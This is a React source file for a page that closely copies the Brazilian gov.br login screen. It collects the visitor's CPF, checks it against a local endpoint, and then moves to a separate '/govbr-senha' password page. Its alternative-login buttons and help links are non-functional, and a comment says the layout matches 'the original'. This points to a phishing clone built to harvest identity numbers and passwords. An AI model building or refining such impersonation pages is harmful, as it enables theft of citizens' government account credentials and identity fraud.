import { useState } from 'react'
import { useNavigate } from 'react-router-dom'

export default function GovBrLoginPage() {
  const navigate = useNavigate()
  const [cpf, setCpf] = useState('')
  const [erro, setErro] = useState('')
  const [loading, setLoading] = useState(false)

  const formatCpf = (v) => {
    const d = v.replace(/\D/g, '').slice(0, 11)
    if (d.length <= 3) return d
    if (d.length <= 6) return `${d.slice(0,3)}.${d.slice(3)}`
    if (d.length <= 9) return `${d.slice(0,3)}.${d.slice(3,6)}.${d.slice(6)}`
    return `${d.slice(0,3)}.${d.slice(3,6)}.${d.slice(6,9)}-${d.slice(9)}`
  }

  async function handleContinuar() {
    if (!cpf.trim()) {
      setErro('CPF deve ser informado. (ERL0000300)')
      return
    }
    const digits = cpf.replace(/\D/g, '')
    if (digits.length !== 11) {
      setErro('CPF inválido. Verifique os números digitados.')
      return
    }

    setErro('')
    setLoading(true)
    try {
      const res = await fetch('/api/public/check-cpf', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cpf }),
      })
      let data = {}
      const text = await res.text()
      if (text) {
        try { data = JSON.parse(text) } catch { /* resposta não-JSON */ }
      }
      if (!res.ok) {
        setErro(data.error || (res.status === 404 && !data.error ? 'CPF não cadastrado no sistema.' : 'Não foi possível verificar o CPF.'))
        return
      }
      navigate('/govbr-senha', { state: { cpf } })
    } catch {
      setErro('Não foi possível conectar ao servidor.')
    } finally {
      setLoading(false)
    }
  }

  return (
    <div style={{ display: 'flex', flexDirection: 'column', minHeight: '100vh', background: '#F0F0F0', fontFamily: "'Rawline','Roboto',sans-serif", overflow: 'hidden' }}>

      {/* Header azul escuro */}
      <div style={{
        background: '#071D41',
        display: 'flex', alignItems: 'center',
        padding: '0 16px', height: 56, flexShrink: 0,
      }}>
        <button onClick={() => navigate('/')} style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 6, marginRight: 8, display: 'flex', alignItems: 'center' }}>
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
            <path d="M15 19L8 12L15 5" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </button>
        <span style={{ color: '#fff', fontWeight: 700, fontSize: 15, letterSpacing: '0.05em' }}>
          ENTRAR COM GOV.BR
        </span>
      </div>

      {/* Barra gov.br */}
      <div style={{ background: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '10px 16px', borderBottom: '1px solid #E0E0E0' }}>
        <img src="/logo-govbr.png" alt="gov.br" style={{ height: 32 }} />
        <div style={{ display: 'flex', gap: 14, alignItems: 'center' }}>
          <img src="/circle-half-stroke-solid.svg" alt="contraste" style={{ width: 22, height: 22, opacity: 0.7 }} />
          <img src="/ear-deaf-solid.svg" alt="acessibilidade" style={{ width: 22, height: 22, opacity: 0.7 }} />
        </div>
      </div>

      {/* Conteúdo */}
      <div style={{ flex: 1, padding: '32px 36px 40px', overflowY: 'auto' }}>
        <div style={{ background: '#fff', borderRadius: 6, padding: '20px 16px 12px', boxShadow: '0 1px 4px rgba(0,0,0,0.10)', marginBottom: 20 }}>

          <p style={{ fontWeight: 700, fontSize: 16, color: '#1C1C1E', margin: '0 0 18px' }}>
            Identifique-se no gov.br com:
          </p>

          {/* Ícone CPF + título */}
          <div style={{ display: 'flex', gap: 10, alignItems: 'center', marginBottom: 8 }}>
            <img src="/id-card-solid.png" alt="CPF" style={{ width: 32, height: 24, objectFit: 'contain', flexShrink: 0 }} />
            <p style={{ fontWeight: 700, fontSize: 15, color: '#1C1C1E', margin: 0 }}>Número do CPF</p>
          </div>

          <p style={{ fontSize: 13, color: '#555', margin: '0 0 14px', lineHeight: 1.5 }}>
            Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
          </p>

          <p style={{ fontSize: 13, color: '#333', margin: '0 0 6px', fontWeight: 700 }}>CPF</p>
          <input
            type="text" inputMode="numeric" placeholder="Digite seu CPF"
            value={cpf} onChange={e => { setCpf(formatCpf(e.target.value)); setErro('') }}
            onKeyDown={e => e.key === 'Enter' && handleContinuar()}
            disabled={loading}
            style={{ width: '100%', height: 50, border: `1.5px solid ${erro ? '#E8A000' : '#999'}`, borderRadius: 4, padding: '0 14px', fontSize: 16, color: '#1C1C1E', background: '#fff', boxSizing: 'border-box', outline: 'none', fontFamily: 'inherit' }}
          />
          {erro && (
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, background: '#FFF9C4', border: '1px solid #E8A000', borderRadius: 4, padding: '10px 12px', marginTop: 8 }}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0 }}>
                <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" fill="#E8A000"/>
                <line x1="12" y1="9" x2="12" y2="13" stroke="white" strokeWidth="2" strokeLinecap="round"/>
                <circle cx="12" cy="17" r="1" fill="white"/>
              </svg>
              <span style={{ fontSize: 13, color: '#5C4000', fontWeight: 500 }}>{erro}</span>
            </div>
          )}

          <button
            onClick={handleContinuar}
            disabled={loading}
            style={{ width: '100%', height: 52, background: '#1351B4', border: 'none', borderRadius: 100, color: '#fff', fontWeight: 700, fontSize: 17, cursor: loading ? 'not-allowed' : 'pointer', opacity: loading ? 0.7 : 1, marginTop: 24, marginBottom: 18, fontFamily: 'inherit' }}
          >
            {loading ? 'Verificando...' : 'Continuar'}
          </button>

          <p style={{ fontSize: 13, color: '#444', margin: '0 0 8px', fontWeight: 400 }}>Outras opções de identificação:</p>
          <div style={{ height: 1, background: '#C0C0C0', marginBottom: 6 }} />

          {[
            { img: '/InternetBanking-green.png', label: 'Login com seu banco', labelColor: '#168821', badge: 'SUA CONTA SERÁ PRATA' },
            { img: '/user-mobile.png',           label: 'Seu aplicativo gov.br',            labelColor: '#1C1C1E' },
            { img: '/CD.png',                    label: 'Seu certificado digital',           labelColor: '#1C1C1E' },
            { img: '/CD-Nuvem.png',              label: 'Seu certificado digital em nuvem', labelColor: '#1C1C1E' },
          ].map((opt, i, arr) => (
            <button key={i} style={{ width: '100%', background: 'none', border: 'none', display: 'flex', alignItems: 'center', gap: 12, padding: '11px 0', cursor: 'pointer', borderBottom: i < arr.length - 1 ? '1px solid #F0F0F0' : 'none' }}>
              <img src={opt.img} alt="" style={{ width: 28, height: 28, objectFit: 'contain', flexShrink: 0 }} />
              <span style={{ fontSize: 14, color: opt.labelColor, fontWeight: 500, textAlign: 'left' }}>{opt.label}</span>
              {opt.badge && (
                <span style={{ background: '#168821', color: '#fff', fontSize: 9, fontWeight: 700, padding: '2px 6px', borderRadius: 2, letterSpacing: '0.03em', whiteSpace: 'nowrap' }}>
                  {opt.badge}
                </span>
              )}
            </button>
          ))}

          {/* Links dentro do card — igual ao original */}
          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 10, marginTop: 20, paddingTop: 16 }}>
            <a href="#" style={{ display: 'flex', alignItems: 'center', gap: 6, textDecoration: 'none' }} onClick={e => e.preventDefault()}>
              <img src="/circle-question-solid-blue.svg" alt="" style={{ width: 18, height: 18 }} />
              <span style={{ fontSize: 13.5, color: '#1351B4', textDecoration: 'underline' }}>Está com dúvidas e precisa de ajuda?</span>
            </a>
            <a href="#" style={{ fontSize: 13.5, color: '#1351B4', textDecoration: 'underline' }} onClick={e => e.preventDefault()}>
              Termo de Uso e Aviso de Privacidade
            </a>
          </div>

        </div>
      </div>
    </div>
  )
}
